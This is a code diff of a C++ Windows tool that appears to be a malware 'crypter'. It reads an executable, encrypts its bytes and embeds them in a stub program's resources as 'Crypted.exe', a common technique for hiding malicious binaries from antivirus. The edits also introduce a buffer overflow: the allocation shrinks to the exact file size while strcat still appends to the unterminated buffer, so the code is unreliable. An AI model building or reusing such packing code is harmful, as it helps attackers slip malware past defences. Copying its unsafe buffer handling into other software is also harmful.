@@ -77,7 +77,7 @@ void RDF() //The Function that Reads the File and Copies the stub
 	cout << fs;
 	cout << " Bytes\n";
 	cout << "Allocating Memory for the ReadFile function\n";
-	FB = new char[fs+1];// Allocate the exact ammount of space 
+	FB = new char[fs];// Allocate the exact ammount of space 
 	cout << "Reading the file\n";
 	ReadFile(efile, FB, fs, &bt, NULL);//Read the file (put the files data in to a FB buffer)
 	CloseHandle(efile);//close the handle
@@ -100,6 +100,8 @@ void enc() // The function that Encrypts the info on the FB buffer
 				}
 		}
 		break;
+	case '3':
+		return;
 	}
 }
 
@@ -122,7 +124,6 @@ void choose_enc()
 
 void WriteToResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize) // Function that Writes Data to resources 
 {
-	
 	cout << "Writing Encrypted data to stub's resources\n";
 	HANDLE hResource = NULL;
 	hResource = BeginUpdateResource(szTargetPE, FALSE);
@@ -135,8 +136,7 @@ int main() // The main function (Entry point)
 	choose_enc();
 	enc(); //Encrypt it 
 	strcat(FB, choice);
-	cout << FB[strlen(FB)-1] << endl;
-	WriteToResources(output/*L"Crypted.exe"*/, 1, (BYTE *)FB, fs+1);//Write the encrypted data to resources
+	WriteToResources(output/*L"Crypted.exe"*/, 1, (BYTE *)FB, fs);//Write the encrypted data to resources
 	//WriteToResources(L"temp.dat", 1, (BYTE *)choice, dwBytesWritten);
 	cout << "Your File Got Crypted\n";
 	system("PAUSE");
